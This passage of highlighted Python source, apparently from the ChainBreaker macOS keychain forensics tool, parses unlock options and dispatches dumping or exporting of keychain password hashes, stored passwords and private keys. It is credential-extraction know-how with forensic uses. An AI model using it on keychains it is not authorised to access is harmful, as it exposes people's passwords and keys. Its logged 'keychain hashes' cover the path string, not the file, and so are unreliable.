</span></span><span style="display:flex;"><span>                             action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;key_prompt&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    unlock_args<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--key&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Unlock the keychain with a key, provided via argument.&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                           <span style="color:#e6db74">&#39;Caution: This is insecure and you should likely use --key-prompt instead&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    unlock_args<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--unlock-file&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Unlock the keychain with a key file&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Output arguments</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    output_args <span style="color:#f92672">=</span> arguments<span style="color:#f92672">.</span>add_argument_group(<span style="color:#e6db74">&#39;Output Options&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    output_args<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--output&#39;</span>, <span style="color:#e6db74">&#39;-o&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Directory to output exported records to.&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    output_args<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-d&#39;</span>, <span style="color:#e6db74">&#39;--debug&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Print debug information&#34;</span>, action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;store_const&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;loglevel&#34;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                             const<span style="color:#f92672">=</span>logging<span style="color:#f92672">.</span>DEBUG)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    arguments<span style="color:#f92672">.</span>set_defaults(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        loglevel<span style="color:#f92672">=</span>logging<span style="color:#f92672">.</span>INFO,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        dump_all<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        dump_keychain_password_hash<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        dump_generic_passwords<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        dump_internet_passwords<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        dump_appleshare_passwords<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        dump_private_keys<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        dump_public_keys<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        dump_x509_certificates<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        export_keychain_password_hash<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        export_generic_passwords<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        export_internet_passwords<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        export_appleshare_passwords<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        export_private_keys<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        export_public_keys<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        export_x509_certificates<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        export_all<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        check_unlock<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        password_prompt<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        key_prompt<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        password<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        key<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        unlock_file<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> arguments<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>password_prompt:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        args<span style="color:#f92672">.</span>password <span style="color:#f92672">=</span> getpass<span style="color:#f92672">.</span>getpass(<span style="color:#e6db74">&#39;Unlock Password: &#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>key_prompt:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        args<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> getpass<span style="color:#f92672">.</span>getpass(<span style="color:#e6db74">&#39;Unlock Key: &#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># create logger</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    logging<span style="color:#f92672">.</span>basicConfig(format<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%(asctime)s</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">%(levelname)s</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">%(message)s</span><span style="color:#e6db74">&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        level<span style="color:#f92672">=</span>args<span style="color:#f92672">.</span>loglevel,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        stream<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stdout)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    logger <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>getLogger(<span style="color:#e6db74">&#39;Chainbreaker&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>output:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(args<span style="color:#f92672">.</span>output):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                os<span style="color:#f92672">.</span>makedirs(args<span style="color:#f92672">.</span>output)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">OSError</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                logger<span style="color:#f92672">.</span>critical(<span style="color:#e6db74">&#34;Unable to create output directory: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> args<span style="color:#f92672">.</span>output)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        logger<span style="color:#f92672">.</span>addHandler(logging<span style="color:#f92672">.</span>FileHandler(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(args<span style="color:#f92672">.</span>output, <span style="color:#e6db74">&#39;output.log&#39;</span>), mode<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;w&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        args<span style="color:#f92672">.</span>output <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getcwd()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># If dump-all or export-all is set, set the individual args</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>dump_all:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        args<span style="color:#f92672">.</span>dump_keychain_password_hash <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>dump_generic_passwords <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>dump_internet_passwords <span style="color:#f92672">=</span> \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            args<span style="color:#f92672">.</span>dump_appleshare_passwords <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>dump_public_keys <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>dump_private_keys <span style="color:#f92672">=</span> \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            args<span style="color:#f92672">.</span>dump_x509_certificates <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>export_all:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        args<span style="color:#f92672">.</span>export_keychain_password_hash <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>export_generic_passwords <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>export_internet_passwords <span style="color:#f92672">=</span> \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            args<span style="color:#f92672">.</span>export_appleshare_passwords <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>export_public_keys <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>export_private_keys <span style="color:#f92672">=</span> \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            args<span style="color:#f92672">.</span>export_x509_certificates <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Make sure we&#39;re actually doing something, exit if we&#39;re not.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> (args<span style="color:#f92672">.</span>dump_keychain_password_hash <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>dump_generic_passwords <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>dump_internet_passwords \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>dump_appleshare_passwords <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>dump_public_keys <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>dump_private_keys <span style="color:#f92672">or</span> \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            args<span style="color:#f92672">.</span>dump_x509_certificates <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>export_keychain_password_hash <span style="color:#f92672">or</span> \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            args<span style="color:#f92672">.</span>export_generic_passwords <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>export_internet_passwords \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>export_appleshare_passwords <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>export_private_keys <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>export_public_keys <span style="color:#f92672">or</span> \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            args<span style="color:#f92672">.</span>export_x509_certificates <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>dump_all <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>export_all <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>check_unlock):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        logger<span style="color:#f92672">.</span>critical(<span style="color:#e6db74">&#34;No action specified.&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Calculate the MD5 and SHA256 of the input keychain file.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    keychain_md5 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(args<span style="color:#f92672">.</span>keychain)<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    keychain_sha256 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(args<span style="color:#f92672">.</span>keychain)<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Print out some summary info before we actually start doing any work.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    summary_output <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">ChainBreaker 2 - https://github.com/gaddie-3/chainbreaker</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Runtime Command: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> <span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">.</span>join(sys<span style="color:#f92672">.</span>argv),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Keychain: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> args<span style="color:#f92672">.</span>keychain,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Keychain MD5: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> keychain_md5,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Keychain 256: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> keychain_sha256,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Dump Start: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>now(),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> summary_output:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        logger<span style="color:#f92672">.</span>info(line)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    summary_output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;Dump Summary:&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Done parsing out input options, now actually do the work.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    keychain <span style="color:#f92672">=</span> Chainbreaker(args<span style="color:#f92672">.</span>keychain, unlock_password<span style="color:#f92672">=</span>args<span style="color:#f92672">.</span>password, unlock_key<span style="color:#f92672">=</span>args<span style="color:#f92672">.</span>key,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                            unlock_file<span style="color:#f92672">=</span>args<span style="color:#f92672">.</span>unlock_file)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># New line to print DB key:</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> keychain<span style="color:#f92672">.</span>db_key:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[+] DB Key: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hexlify(keychain<span style="color:#f92672">.</span>db_key)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[!] DB Key not found or keychain is locked.&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>check_unlock:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> keychain<span style="color:#f92672">.</span>locked:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Invalid Unlock Options&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Keychain Unlock Successful.&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    output <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>dump_keychain_password_hash <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>export_keychain_password_hash:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        output<span style="color:#f92672">.</span>append(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;header&#39;</span>: <span style="color:#e6db74">&#39;Keychain Password Hash&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;records&#39;</span>: [keychain<span style="color:#f92672">.</span>dump_keychain_password_hash()],  <span style="color:#75715e"># A little hackish, but whatever.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_to_console&#39;</span>: args<span style="color:#f92672">.</span>dump_keychain_password_hash,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_to_disk&#39;</span>: args<span style="color:#f92672">.</span>export_keychain_password_hash,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_directory&#39;</span>: os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(args<span style="color:#f92672">.</span>output)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>dump_generic_passwords <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>export_generic_passwords:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        output<span style="color:#f92672">.</span>append(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;header&#39;</span>: <span style="color:#e6db74">&#39;Generic Passwords&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;records&#39;</span>: keychain<span style="color:#f92672">.</span>dump_generic_passwords(),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_to_console&#39;</span>: args<span style="color:#f92672">.</span>dump_generic_passwords,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_to_disk&#39;</span>: args<span style="color:#f92672">.</span>export_generic_passwords,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_directory&#39;</span>: os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(args<span style="color:#f92672">.</span>output, <span style="color:#e6db74">&#39;passwords&#39;</span>, <span style="color:#e6db74">&#39;generic&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>dump_internet_passwords <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>export_internet_passwords:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        output<span style="color:#f92672">.</span>append(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;header&#39;</span>: <span style="color:#e6db74">&#39;Internet Passwords&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;records&#39;</span>: keychain<span style="color:#f92672">.</span>dump_internet_passwords(),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_to_console&#39;</span>: args<span style="color:#f92672">.</span>dump_internet_passwords,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_to_disk&#39;</span>: args<span style="color:#f92672">.</span>export_internet_passwords,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_directory&#39;</span>: os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(args<span style="color:#f92672">.</span>output, <span style="color:#e6db74">&#39;passwords&#39;</span>, <span style="color:#e6db74">&#39;internet&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>dump_appleshare_passwords <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>export_appleshare_passwords:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        output<span style="color:#f92672">.</span>append(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;header&#39;</span>: <span style="color:#e6db74">&#39;Appleshare Passwords&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;records&#39;</span>: keychain<span style="color:#f92672">.</span>dump_appleshare_passwords(),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_to_console&#39;</span>: args<span style="color:#f92672">.</span>dump_appleshare_passwords,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_to_disk&#39;</span>: args<span style="color:#f92672">.</span>export_appleshare_passwords,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_directory&#39;</span>: os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(args<span style="color:#f92672">.</span>output, <span style="color:#e6db74">&#39;passwords&#39;</span>, <span style="color:#e6db74">&#39;appleshare&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>dump_private_keys <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>export_private_keys:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        output<span style="color:#f92672">.</span>append(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;header&#39;</span>: <span style="color:#e6db74">&#39;Private Keys&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;records&#39;</span>: keychain<span style="color:#f92672">.</span>dump_private_keys(),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_to_console&#39;</span>: args<span style="color:#f92672">.</span>dump_private_keys,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_to_disk&#39;</span>: args<span style="color:#f92672">.</span>export_private_keys,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;write_directory&#39;</span>: os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(args<span style="color:#f92672">.</span>output, <span style="color:#e6db74">&#39;keys&#39;</span>, <span style="color:#e6db74">&#39;private&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>dump_public_keys <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>export_public_keys:
</span></span><span style="display:flex;"><span>
